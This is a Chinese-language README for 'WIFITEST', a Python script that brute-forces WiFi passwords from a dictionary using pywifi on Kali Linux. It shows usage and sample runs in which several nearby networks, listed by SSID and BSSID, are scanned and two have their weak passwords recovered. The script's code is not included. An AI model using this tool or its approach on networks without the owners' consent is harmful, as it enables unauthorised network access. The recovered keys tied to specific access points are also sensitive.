WIFITEST
======

一个简单的WIFI弱口令暴破的python脚本，可自动实时破解，不需要使用aircrack-ng抓包，只是有点慢...

* python only
* Linux平台，在kali下测试通过
* 成功率依赖于字典和无线网络的信号强度
* 参考来源: [一个非常简单易懂的WIFI密码爆破python脚本](https://my.oschina.net/Apathy/blog/821039)

安装和依赖
-------------

	1、pywifi: pip install pywifi
	2、无线网卡
	3、Linux与python2.7

    
使用
-------------

```bash
	usage: wifitest.py [-h] [-m {a,m}] [-k KEY_FILE]
	
	optional arguments:
	  -h, --help            show this help message and exit
	  -m {a,m}, --mode {a,m}
	                        test mode:a(auto) or m(manual)
	  -k KEY_FILE, --key_file KEY_FILE
	                        test password dict file,default is top10.txt
```

 * 自动测试模式


```bash

root@kali:~# python wifitest.py
Total KEYS 10
Wifi interface found: wlan0
TEST WIFI LIST:
No   SSID                  BSSID                  SIGNAL   ENC/AUTH
1    TP-LINK_8446        | bc:46:99:6d:84:46    | -57    | WPAPSK/WPA2PSK
2    Tenda_12ABD8        | c8:3a:35:12:ab:d8    | -58    | WPAPSK
3    TP-LINK_D4D0        | fc:d7:33:55:d4:d0    | -71    | WPAPSK/WPA2PSK
4    RP                  | 84:1b:5e:f2:fe:ce    | -64    | WPA2PSK
5    \xb7\xcf\xc6\xb7\xbb\xd8\xca\xd5| ec:26:ca:ef:08:7a    | -61    | WPAPSK/WPA2PSK
6    laoxiejia           | 64:09:80:5d:6f:38    | -49    | WPAPSK/WPA2PSK
7    B-LINK_F20D82       | 3c:33:00:f2:0d:82    | -57    | WPA2PSK
8    TPGuest_D4D0        | f6:d7:33:55:d4:d0    | -64    | WPAPSK/WPA2PSK
9    360WiFi-79DAA1      | a4:56:02:79:da:a1    | -52    | WPAPSK/WPA2PSK
TOTAL TEST WIFI:9
------------------------------------------------------------------------
WIFINO| SSID OR BSSID     |  TIME  | KEYNUM KEY             | STATUS
========================================================================
1     | TP-LINK_8446      |  4.01s | 9      123456789       | FOUND!
2     | Tenda_12ABD8      |        |                        | FAIL!
3     | TP-LINK_D4D0      |        |                        | FAIL!
4     | RP                |        |                        | FAIL!
...
```

* 手动测试模式

```bash
root@kali:~# python wifitest.py -m m -k top10.txt
Total KEYS 10
Wifi interface found: wlan0
------------------------------------------------------------------------
No   SSID                  BSSID                  SIGNAL   ENC/AUTH
1    Tenda_12ABD8        | c8:3a:35:12:ab:d8    | -57    | WPAPSK
2    CMCC-FREEMM         | 96:74:2a:b2:74:2a    | -56    |
3    laoxiejia           | 64:09:80:5d:6f:38    | -49    | WPAPSK/WPA2PSK
4    B-LINK_F20D82       | 3c:33:00:f2:0d:82    | -54    | WPA2PSK
5    and-Business        | a6:74:2a:b2:74:2a    | -56    |
6    <length: 0>         | 50:bd:5f:e6:3c:fa    | -32    | WPAPSK/WPA2PSK
7    CMCC-CSDL           | 84:74:2a:b2:74:2a    | -54    |
8    TPGuest_405A        | f6:d7:33:6e:40:5a    | -61    |
9    TP-LINK_8446        | bc:46:99:6d:84:46    | -57    | WPAPSK/WPA2PSK
10   <length: 0>         | fc:d7:33:6e:40:5a    | -62    | WPAPSK/WPA2PSK
...
Please choose test No:4,9,1
------------------------------------------------------------------------
WIFINO| SSID OR BSSID     |  TIME  | KEYNUM KEY             | STATUS
========================================================================
4     | B-LINK_F20D82     |  7.13s | 2      147258369       | FOUND!
9     | TP-LINK_8446      |  4.06s | 9      123456789       | FOUND!
1     | Tenda_12ABD8      |        |                        | FAIL!

Done...
```
